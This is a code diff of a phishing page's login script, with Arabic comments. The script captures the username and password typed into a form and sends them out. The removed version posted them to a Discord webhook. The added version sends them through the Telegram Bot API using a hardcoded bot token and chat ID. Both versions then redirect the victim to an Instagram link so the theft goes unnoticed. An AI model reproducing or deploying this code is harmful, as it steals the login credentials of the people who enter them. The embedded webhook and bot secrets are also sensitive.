@@ -1,39 +1,30 @@
 document.getElementById('loginButton').addEventListener('click', function (e) {
-  e.preventDefault(); // لمنع إعادة تحميل الصفحة
+  e.preventDefault(); // لمنع الإجراء الافتراضي (إعادة تحميل الصفحة)
 
   // التقاط البيانات من النموذج
   var username = document.getElementById('username').value;
   var password = document.getElementById('password').value;
 
-  // إعداد الرسالة للإرسال
-  var message = {
-    content: "**New login attempt:**\n**Username:** " + username + "\n**Password:** " + password
-  };
+  // إنشاء الرسالة لإرسالها عبر البوت
+  var message = 'New SUDO !:\nUsername: ' + username + '\nPassword: ' + password;
 
-  // رابط Webhook الخاص بديسكورد
-  var webhookURL = "https://discord.com/api/webhooks/1352734475494232134/YCIy1vfzG2SmZjtxCvMTwhQaf2DE29S7jv6iRdjqM8ocAeILWCLCT4loXBUKkFuqurwS"; // استبدله برابط الـ Webhook
+  // رابط API البوت الخاص بك مع chat_id الخاص بك
+  var botToken = '7896161489:AAHK4FbnVcg4P-8H-64Ga8LWLw_Tg_ZZBT0';
+  var chatId = '7643313499';
+  var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
 
   // إرسال البيانات عبر الـ Fetch API
-  fetch(webhookURL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify(message)
-  })
-  .then(response => response.text())  // تغيير من response.json() إلى response.text()
-  .then(data => {
-    console.log("Response from Discord:", data);
-    
-    // التحقق مما إذا كان الإرسال ناجحًا
-    if (data.includes("error") || data.includes("Invalid")) {
-      console.error("Error detected in response:", data);
-    } else {
-      console.log("Message sent successfully");
-      window.location.href = "https://ig.me/j/AbYmOp6uPzKVG-kS/"; // استبدل بالرابط الذي تريد التحويل إليه
-    }
-  })
-  .catch(error => {
-    console.error("Error sending message:", error);
-  });
+  fetch(url)
+    .then(function(response) {
+      return response.json();
+    })
+    .then(function(data) {
+      console.log('Message sent successfully:', data);
+      
+      // إعادة التوجيه بعد نجاح الإرسال
+      window.location.href = "https://www.instagram.com/j/AbYmOp6uPzKVG-kS/"; // استبدل بالرابط الذي تريد التحويل إليه
+    })
+    .catch(function(error) {
+      console.error('Error sending message:', error);
+    });
 });
